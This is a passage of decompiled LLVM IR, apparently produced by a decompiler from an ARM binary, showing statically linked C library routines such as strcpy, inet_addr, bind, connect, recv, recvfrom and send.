  %v3_11054 = inttoptr i32 %v5_11050 to i8*
  store i8 %v1_11054, i8* %v3_11054, align 1
  %v4_11054 = load i32, i32* %r3.global-to-local, align 4
  %v5_11054 = add i32 %v4_11054, 1
  store i32 %v5_11054, i32* @r3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_10ff0, { 1, 0 }
  uselistorder i32 %v12_1101c, { 1, 2, 0 }
  uselistorder i32 %v0_10ff054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_10fe8.pr, { 0, 2, 1 }
  uselistorder i32 %v6_10fd8, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_10fcc, { 1, 0 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r2.global-to-local, { 2, 10, 3, 4, 5, 6, 7, 8, 9, 1, 12, 13, 11, 0 }
  uselistorder i32* %ip.global-to-local, { 4, 1, 2, 3, 0, 5 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 4, 3, 2, 5, 1, 9, 8, 0, 7 }
  uselistorder i32 %arg3, { 1, 0, 3, 2, 4 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_11028, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_11000, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %v0_110701 = load i32, i32* @r1, align 4
  %v1_110702 = inttoptr i32 %v0_110701 to i8*
  %v2_110703 = load i8, i8* %v1_110702, align 1
  %v2_110745 = icmp eq i8 %v2_110703, 0
  store i1 %v2_110745, i1* %cpsr_z.global-to-local, align 1
  store i8 %v2_110703, i8* %arg1, align 1
  br i1 %v2_110745, label %dec_label_pc_11080, label %dec_label_pc_11068

dec_label_pc_11068:                               ; preds = %entry, %dec_label_pc_11068
  %v0_11068 = load i32, i32* @r1, align 4
  %v1_11068 = add i32 %v0_11068, 1
  store i32 %v1_11068, i32* @r1, align 4
  %v0_1106c = load i32, i32* %r2.global-to-local, align 4
  %v1_1106c = add i32 %v0_1106c, 1
  store i32 %v1_1106c, i32* %r2.global-to-local, align 4
  %v1_11070 = inttoptr i32 %v1_11068 to i8*
  %v2_11070 = load i8, i8* %v1_11070, align 1
  %v2_11074 = icmp eq i8 %v2_11070, 0
  store i1 %v2_11074, i1* %cpsr_z.global-to-local, align 1
  %v3_11078 = inttoptr i32 %v1_1106c to i8*
  store i8 %v2_11070, i8* %v3_11078, align 1
  %v0_1107c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1107c, label %dec_label_pc_11080, label %dec_label_pc_11068

dec_label_pc_11080:                               ; preds = %dec_label_pc_11068, %entry
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 0 }
  uselistorder label %dec_label_pc_11068, { 1, 0 }
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_1108c = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_1108c, i32* @r1, align 4
  %v0_11090 = call i32 @inet_aton()
  %v2_11094 = icmp eq i32 %v0_11090, 0
  %v4_11098 = load i32, i32* %stack_var_-12, align 4
  %storemerge = select i1 %v2_11094, i32 -1, i32 %v4_11098
  ret i32 %storemerge
}

define i32 @bind(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_110ac = load i32, i32* @r7, align 4
  store i32 %v3_110ac, i32* %stack_var_-8, align 4
  %v0_110b8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_110b8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_110b8, -4095
  br i1 %tmp, label %dec_label_pc_110e0, label %dec_label_pc_110c8

dec_label_pc_110c8:                               ; preds = %entry
  %v0_110cc = call i32 @__aeabi_read_tp()
  %v3_110d0 = load i16, i16* @global_var_21510.336, align 2
  %v4_110d0 = sext i16 %v3_110d0 to i32
  %v0_110d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_110d4 = sub i32 0, %v0_110d4
  store i32 %v1_110d4, i32* %r2.global-to-local, align 4
  %v3_110d8 = add i32 %v4_110d0, %v0_110cc
  %v4_110d8 = inttoptr i32 %v3_110d8 to i32*
  store i32 %v1_110d4, i32* %v4_110d8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_110e0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_110e0

dec_label_pc_110e0:                               ; preds = %entry, %dec_label_pc_110c8
  %v1_110e4 = phi i32 [ %v0_110b8, %entry ], [ -1, %dec_label_pc_110c8 ]
  %v2_110e0 = phi i32 [ %v3_110ac, %entry ], [ %v2_110e0.pre, %dec_label_pc_110c8 ]
  store i32 %v2_110e0, i32* @r7, align 4
  ret i32 %v1_110e4

; uselistorder directives
  uselistorder i32 %v0_110b8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_110e0, { 1, 0 }
}

define i32 @"$d.8"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_110e8:
  %v0_110e8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_110e8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_110e8
  %v2_110ec = load i32, i32* @r8, align 4
  %v3_110ec = load i32, i32* @r4, align 4
  %v8_110ec = lshr i32 %v2_110ec, %v3_110ec
  %v9_110ec = and i32 %v8_110ec, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_110e8, %bb
  %v10_110ec = phi i32 [ %arg1, %dec_label_pc_110e8 ], [ %v9_110ec, %bb ]
  ret i32 %v10_110ec

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__sys_connect() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_110f0 = load i32, i32* @r7, align 4
  store i32 %v3_110f0, i32* %stack_var_-8, align 4
  %v0_110fc = load i32, i32* @r0, align 4
  store i32 %v0_110fc, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_110fc, -4095
  br i1 %tmp, label %dec_label_pc_11124, label %dec_label_pc_1110c

dec_label_pc_1110c:                               ; preds = %entry
  %v0_11110 = call i32 @__aeabi_read_tp()
  %v3_11114 = load i16, i16* @global_var_21510.336, align 2
  %v4_11114 = sext i16 %v3_11114 to i32
  store i32 %v4_11114, i32* @r3, align 4
  %v0_11118 = load i32, i32* %r2.global-to-local, align 4
  %v1_11118 = sub i32 0, %v0_11118
  store i32 %v1_11118, i32* %r2.global-to-local, align 4
  %v3_1111c = add i32 %v4_11114, %v0_11110
  %v4_1111c = inttoptr i32 %v3_1111c to i32*
  store i32 %v1_11118, i32* %v4_1111c, align 4
  %v2_11124.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11124

dec_label_pc_11124:                               ; preds = %entry, %dec_label_pc_1110c
  %v1_11128 = phi i32 [ %v0_110fc, %entry ], [ -1, %dec_label_pc_1110c ]
  %v2_11124 = phi i32 [ %v3_110f0, %entry ], [ %v2_11124.pre, %dec_label_pc_1110c ]
  store i32 %v2_11124, i32* @r7, align 4
  ret i32 %v1_11128

; uselistorder directives
  uselistorder i32 %v0_110fc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11124, { 1, 0 }
}

define i32 @"$d.7"(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_1112c:
  %v0_1112c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1112c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1112c
  %tmp = ptrtoint i32* %arg2 to i32
  %v2_1112c = load i32, i32* @fp, align 4
  %v8_1112c = shl i32 %v2_1112c, %tmp
  %v9_1112c = and i32 %v8_1112c, %arg1
  store i32 %v9_1112c, i32* %arg2, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1112c, %bb
  %v8_11130 = phi i32 [ %arg1, %dec_label_pc_1112c ], [ %v9_1112c, %bb ]
  ret i32 %v8_11130

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_11138 = load i32, i32* @r4, align 4
  store i32 %v3_11138, i32* %stack_var_-20, align 4
  %v6_11138 = load i32, i32* @r5, align 4
  %v9_11138 = load i32, i32* @r6, align 4
  %v12_11138 = load i32, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* @r3, align 4
  %v4_11144 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 12772) to i32*), align 4
  store i32 %v4_11144, i32* @ip, align 4
  %v2_11148 = icmp eq i32 %v4_11144, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v2_11148, label %dec_label_pc_11160, label %entry.dec_label_pc_1116c_crit_edge

entry.dec_label_pc_1116c_crit_edge:               ; preds = %entry
  br label %dec_label_pc_1116c

dec_label_pc_11160:                               ; preds = %entry
  store i32 %v3_11138, i32* @r4, align 4
  store i32 %v9_11138, i32* @r6, align 4
  store i32 %v12_11138, i32* @r7, align 4
  %v0_11168 = call i32 @__sys_connect()
  br label %dec_label_pc_1116c

dec_label_pc_1116c:                               ; preds = %entry.dec_label_pc_1116c_crit_edge, %dec_label_pc_11160
  %v0_1116c = call i32 @__libc_enable_asynccancel()
  %v0_11170 = load i32, i32* @r6, align 4
  store i32 %v0_11170, i32* @r1, align 4
  store i32 %v0_1116c, i32* @r5, align 4
  %v0_1117c = load i32, i32* @r4, align 4
  store i32 %v0_1117c, i32* @r0, align 4
  %v0_11180 = call i32 @__sys_connect()
  store i32 %v0_11180, i32* @r4, align 4
  %v0_11188 = load i32, i32* @r5, align 4
  %v1_1118c = call i32 @__libc_disable_asynccancel(i32 %v0_11188)
  %v0_11190 = load i32, i32* @r4, align 4
  %v2_11198 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_11198, i32* @r4, align 4
  store i32 %v6_11138, i32* @r5, align 4
  store i32 %v9_11138, i32* @r6, align 4
  store i32 %v12_11138, i32* @r7, align 4
  ret i32 %v0_11190

; uselistorder directives
  uselistorder label %dec_label_pc_1116c, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_111a8 = load i32, i32* @r7, align 4
  store i32 %v3_111a8, i32* %stack_var_-8, align 4
  %v0_111b4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_111b4, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_111b4, -4095
  br i1 %tmp, label %dec_label_pc_111dc, label %dec_label_pc_111c4

dec_label_pc_111c4:                               ; preds = %entry
  %v0_111c8 = call i32 @__aeabi_read_tp()
  %v3_111cc = load i16, i16* @global_var_21510.336, align 2
  %v4_111cc = sext i16 %v3_111cc to i32
  %v0_111d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_111d0 = sub i32 0, %v0_111d0
  store i32 %v1_111d0, i32* %r2.global-to-local, align 4
  %v3_111d4 = add i32 %v4_111cc, %v0_111c8
  %v4_111d4 = inttoptr i32 %v3_111d4 to i32*
  store i32 %v1_111d0, i32* %v4_111d4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_111dc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_111dc

dec_label_pc_111dc:                               ; preds = %entry, %dec_label_pc_111c4
  %v1_111e0 = phi i32 [ %v0_111b4, %entry ], [ -1, %dec_label_pc_111c4 ]
  %v2_111dc = phi i32 [ %v3_111a8, %entry ], [ %v2_111dc.pre, %dec_label_pc_111c4 ]
  store i32 %v2_111dc, i32* @r7, align 4
  ret i32 %v1_111e0

; uselistorder directives
  uselistorder i32 %v0_111b4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_111dc, { 1, 0 }
}

define i32 @"$d.6"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_111e4:
  %v0_111e4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_111e4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_111e4
  %v2_111e8 = load i32, i32* @ip, align 4
  %v8_111e8 = lshr i32 %v2_111e8, %arg3
  %v9_111e8 = and i32 %v8_111e8, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_111e4, %bb
  %v10_111e8 = phi i32 [ %arg1, %dec_label_pc_111e4 ], [ %v9_111e8, %bb ]
  ret i32 %v10_111e8

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_111ec = load i32, i32* @r4, align 4
  store i32 %v3_111ec, i32* %stack_var_-12, align 4
  %v0_111fc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_111fc, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_111fc, -4095
  br i1 %tmp, label %dec_label_pc_11224, label %dec_label_pc_1120c

dec_label_pc_1120c:                               ; preds = %entry
  %v0_11210 = call i32 @__aeabi_read_tp()
  %v3_11214 = load i16, i16* @global_var_21510.336, align 2
  %v4_11214 = sext i16 %v3_11214 to i32
  %v0_11218 = load i32, i32* %r2.global-to-local, align 4
  %v1_11218 = sub i32 0, %v0_11218
  store i32 %v1_11218, i32* %r2.global-to-local, align 4
  %v3_1121c = add i32 %v4_11214, %v0_11210
  %v4_1121c = inttoptr i32 %v3_1121c to i32*
  store i32 %v1_11218, i32* %v4_1121c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11224.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_11224

dec_label_pc_11224:                               ; preds = %entry, %dec_label_pc_1120c
  %v1_11228 = phi i32 [ %v0_111fc, %entry ], [ -1, %dec_label_pc_1120c ]
  %v2_11224 = phi i32 [ %v3_111ec, %entry ], [ %v2_11224.pre, %dec_label_pc_1120c ]
  store i32 %v2_11224, i32* @r4, align 4
  ret i32 %v1_11228

; uselistorder directives
  uselistorder i32 %v0_111fc, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11224, { 1, 0 }
}

define i32 @"$d.5"(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_1122c:
  %v0_1122c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1122c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1122c
  %v2_1122c = load i32, i32* @r7, align 4
  %v5_1122c = udiv i32 %v2_1122c, 4
  %v6_1122c = and i32 %v5_1122c, %arg1
  store i32 %v6_1122c, i32* %arg2, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1122c, %bb
  %v8_11230 = phi i32 [ %arg1, %dec_label_pc_1122c ], [ %v6_1122c, %bb ]
  ret i32 %v8_11230

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__sys_recv() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11234 = load i32, i32* @r7, align 4
  store i32 %v3_11234, i32* %stack_var_-8, align 4
  %v0_11240 = load i32, i32* @r0, align 4
  store i32 %v0_11240, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11240, -4095
  br i1 %tmp, label %dec_label_pc_11268, label %dec_label_pc_11250

dec_label_pc_11250:                               ; preds = %entry
  %v0_11254 = call i32 @__aeabi_read_tp()
  %v3_11258 = load i16, i16* @global_var_21510.336, align 2
  %v4_11258 = sext i16 %v3_11258 to i32
  %v0_1125c = load i32, i32* %r2.global-to-local, align 4
  %v1_1125c = sub i32 0, %v0_1125c
  store i32 %v1_1125c, i32* %r2.global-to-local, align 4
  %v3_11260 = add i32 %v4_11258, %v0_11254
  %v4_11260 = inttoptr i32 %v3_11260 to i32*
  store i32 %v1_1125c, i32* %v4_11260, align 4
  %v2_11268.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11268

dec_label_pc_11268:                               ; preds = %entry, %dec_label_pc_11250
  %v1_1126c = phi i32 [ %v0_11240, %entry ], [ -1, %dec_label_pc_11250 ]
  %v2_11268 = phi i32 [ %v3_11234, %entry ], [ %v2_11268.pre, %dec_label_pc_11250 ]
  store i32 %v2_11268, i32* @r7, align 4
  ret i32 %v1_1126c

; uselistorder directives
  uselistorder i32 %v0_11240, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11268, { 1, 0 }
}

define i32 @"$d.4"(i16 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11270:
  %r0.global-to-local = alloca i32, align 4
  %tmp = sext i16 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_11270 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11270, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11270
  %tmp2 = inttoptr i32 %arg2 to i16*
  %v5_11270 = udiv i32 %arg3, 4
  %v6_11270 = and i32 %v5_11270, %tmp
  store i32 %v6_11270, i32* %r0.global-to-local, align 4
  %v2_11274 = trunc i32 %v6_11270 to i16
  store i16 %v2_11274, i16* %tmp2, align 2
  %v6_11274 = load i32, i32* %r0.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11270, %bb
  %v10_11274 = phi i32 [ %tmp, %dec_label_pc_11270 ], [ %v6_11274, %bb ]
  ret i32 %v10_11274

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_1127c = load i32, i32* @r4, align 4
  store i32 %v3_1127c, i32* %stack_var_-24, align 4
  %v6_1127c = load i32, i32* @r5, align 4
  %v9_1127c = load i32, i32* @r6, align 4
  %v12_1127c = load i32, i32* @r7, align 4
  %v15_1127c = load i32, i32* @r8, align 4
  %v18_1127c = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* @ip, align 4
  %v4_11288 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 12772) to i32*), align 4
  %v2_1128c = icmp eq i32 %v4_11288, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  br i1 %v2_1128c, label %dec_label_pc_112a4, label %entry.dec_label_pc_112ac_crit_edge

entry.dec_label_pc_112ac_crit_edge:               ; preds = %entry
  br label %dec_label_pc_112ac

dec_label_pc_112a4:                               ; preds = %entry
  store i32 %v3_1127c, i32* @r4, align 4
  store i32 %v9_1127c, i32* @r6, align 4
  store i32 %v12_1127c, i32* @r7, align 4
  store i32 %v15_1127c, i32* @r8, align 4
  %v0_112a8 = call i32 @__sys_recv()
  br label %dec_label_pc_112ac

dec_label_pc_112ac:                               ; preds = %entry.dec_label_pc_112ac_crit_edge, %dec_label_pc_112a4
  %v0_112ac = call i32 @__libc_enable_asynccancel()
  %v0_112b0 = load i32, i32* @r6, align 4
  store i32 %v0_112b0, i32* @r1, align 4
  store i32 %v0_112ac, i32* @r5, align 4
  %v0_112c0 = load i32, i32* @r4, align 4
  store i32 %v0_112c0, i32* @r0, align 4
  %v0_112c4 = call i32 @__sys_recv()
  store i32 %v0_112c4, i32* @r4, align 4
  %v0_112cc = load i32, i32* @r5, align 4
  %v1_112d0 = call i32 @__libc_disable_asynccancel(i32 %v0_112cc)
  %v0_112d4 = load i32, i32* @r4, align 4
  %v2_112d8 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_112d8, i32* @r4, align 4
  store i32 %v6_1127c, i32* @r5, align 4
  store i32 %v9_1127c, i32* @r6, align 4
  store i32 %v12_1127c, i32* @r7, align 4
  store i32 %v15_1127c, i32* @r8, align 4
  store i32 %v18_1127c, i32* @lr, align 4
  ret i32 %v0_112d4

; uselistorder directives
  uselistorder label %dec_label_pc_112ac, { 1, 0 }
}

define i32 @__sys_recvfrom() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_112e8 = load i32, i32* @r4, align 4
  store i32 %v3_112e8, i32* %stack_var_-16, align 4
  %v0_112fc = load i32, i32* @r0, align 4
  store i32 %v0_112fc, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_112fc, -4095
  br i1 %tmp, label %dec_label_pc_11324, label %dec_label_pc_1130c

dec_label_pc_1130c:                               ; preds = %entry
  %v0_11310 = call i32 @__aeabi_read_tp()
  %v3_11314 = load i16, i16* @global_var_21510.336, align 2
  %v4_11314 = sext i16 %v3_11314 to i32
  %v0_11318 = load i32, i32* %r2.global-to-local, align 4
  %v1_11318 = sub i32 0, %v0_11318
  store i32 %v1_11318, i32* %r2.global-to-local, align 4
  %v3_1131c = add i32 %v4_11314, %v0_11310
  %v4_1131c = inttoptr i32 %v3_1131c to i32*
  store i32 %v1_11318, i32* %v4_1131c, align 4
  %v2_11324.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_11324

dec_label_pc_11324:                               ; preds = %entry, %dec_label_pc_1130c
  %v1_11328 = phi i32 [ %v0_112fc, %entry ], [ -1, %dec_label_pc_1130c ]
  %v2_11324 = phi i32 [ %v3_112e8, %entry ], [ %v2_11324.pre, %dec_label_pc_1130c ]
  store i32 %v2_11324, i32* @r4, align 4
  ret i32 %v1_11328

; uselistorder directives
  uselistorder i32 %v0_112fc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11324, { 1, 0 }
}

define i32 @__libc_recvfrom(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_11330 = load i32, i32* @r4, align 4
  store i32 %v3_11330, i32* %stack_var_-32, align 4
  %v6_11330 = load i32, i32* @r5, align 4
  %v9_11330 = load i32, i32* @r6, align 4
  %v12_11330 = load i32, i32* @r7, align 4
  %v15_11330 = load i32, i32* @r8, align 4
  %v18_11330 = load i32, i32* @sb, align 4
  %v21_11330 = load i32, i32* @sl, align 4
  %v24_11330 = load i32, i32* @lr, align 4
  %v4_11340 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 12772) to i32*), align 4
  %v2_11348 = icmp eq i32 %v4_11340, 0
  store i32 %arg1, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_11348, label %dec_label_pc_11368, label %dec_label_pc_11374

dec_label_pc_11368:                               ; preds = %entry
  store i32 %v3_11330, i32* @r4, align 4
  store i32 %v12_11330, i32* @r7, align 4
  store i32 %v15_11330, i32* @r8, align 4
  store i32 %v18_11330, i32* %sb.global-to-local, align 4
  %v0_11370 = call i32 @__sys_recvfrom()
  br label %dec_label_pc_11374

dec_label_pc_11374:                               ; preds = %entry, %dec_label_pc_11368
  %v0_11374 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_11374, i32* @r5, align 4
  %v0_11388 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_11388, i32* @r0, align 4
  %v0_11390 = call i32 @__sys_recvfrom()
  store i32 %v0_11390, i32* @r4, align 4
  %v0_11398 = load i32, i32* @r5, align 4
  %v1_1139c = call i32 @__libc_disable_asynccancel(i32 %v0_11398)
  %v0_113a0 = load i32, i32* @r4, align 4
  %v2_113a8 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_113a8, i32* @r4, align 4
  store i32 %v6_11330, i32* @r5, align 4
  store i32 %v9_11330, i32* @r6, align 4
  store i32 %v12_11330, i32* @r7, align 4
  store i32 %v15_11330, i32* @r8, align 4
  store i32 %v18_11330, i32* @sb, align 4
  store i32 %v21_11330, i32* @sl, align 4
  store i32 %v24_11330, i32* @lr, align 4
  ret i32 %v0_113a0

; uselistorder directives
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11374, { 1, 0 }
}

define i32 @__sys_send() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_113b8 = load i32, i32* @r7, align 4
  store i32 %v3_113b8, i32* %stack_var_-8, align 4
  %v0_113c4 = load i32, i32* @r0, align 4
  store i32 %v0_113c4, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_113c4, -4095
  br i1 %tmp, label %dec_label_pc_113ec, label %dec_label_pc_113d4

dec_label_pc_113d4:                               ; preds = %entry
  %v0_113d8 = call i32 @__aeabi_read_tp()
  %v3_113dc = load i16, i16* @global_var_21510.336, align 2
  %v4_113dc = sext i16 %v3_113dc to i32
  store i32 %v4_113dc, i32* @r3, align 4
  %v0_113e0 = load i32, i32* %r2.global-to-local, align 4
  %v1_113e0 = sub i32 0, %v0_113e0
  store i32 %v1_113e0, i32* %r2.global-to-local, align 4
  %v3_113e4 = add i32 %v4_113dc, %v0_113d8
  %v4_113e4 = inttoptr i32 %v3_113e4 to i32*
  store i32 %v1_113e0, i32* %v4_113e4, align 4
  %v2_113ec.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_113ec

dec_label_pc_113ec:                               ; preds = %entry, %dec_label_pc_113d4
  %v1_113f0 = phi i32 [ %v0_113c4, %entry ], [ -1, %dec_label_pc_113d4 ]
  %v2_113ec = phi i32 [ %v3_113b8, %entry ], [ %v2_113ec.pre, %dec_label_pc_113d4 ]
  store i32 %v2_113ec, i32* @r7, align 4
  ret i32 %v1_113f0

; uselistorder directives
  uselistorder i32 %v0_113c4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_113ec, { 1, 0 }
}

define i32 @"$d.3"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_113f4:
  %v0_113f4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_113f4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_113f4
  %v2_113f8 = load i32, i32* @ip, align 4
  %v5_113f8 = udiv i32 %v2_113f8, 4
  %v6_113f8 = and i32 %v5_113f8, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_113f4, %bb
  %v7_113f8 = phi i32 [ %arg1, %dec_label_pc_113f4 ], [ %v6_113f8, %bb ]
  ret i32 %v7_113f8

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_11400 = load i32, i32* @r4, align 4
  store i32 %v3_11400, i32* %stack_var_-24, align 4
  %v6_11400 = load i32, i32* @r5, align 4
  %v9_11400 = load i32, i32* @r6, align 4
  %v12_11400 = load i32, i32* @r7, align 4
  %v15_11400 = load i32, i32* @r8, align 4
  %v18_11400 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* @ip, align 4
  %v4_1140c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 12772) to i32*), align 4
  %v2_11410 = icmp eq i32 %v4_1140c, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  br i1 %v2_11410, label %dec_label_pc_11428, label %entry.dec_label_pc_11430_crit_edge

entry.dec_label_pc_11430_crit_edge:               ; preds = %entry
  br label %dec_label_pc_11430

dec_label_pc_11428:                               ; preds = %entry
  store i32 %v3_11400, i32* @r4, align 4
  store i32 %v9_11400, i32* @r6, align 4
  store i32 %v12_11400, i32* @r7, align 4
  store i32 %v15_11400, i32* @r8, align 4
  %v0_1142c = call i32 @__sys_send()
  br label %dec_label_pc_11430

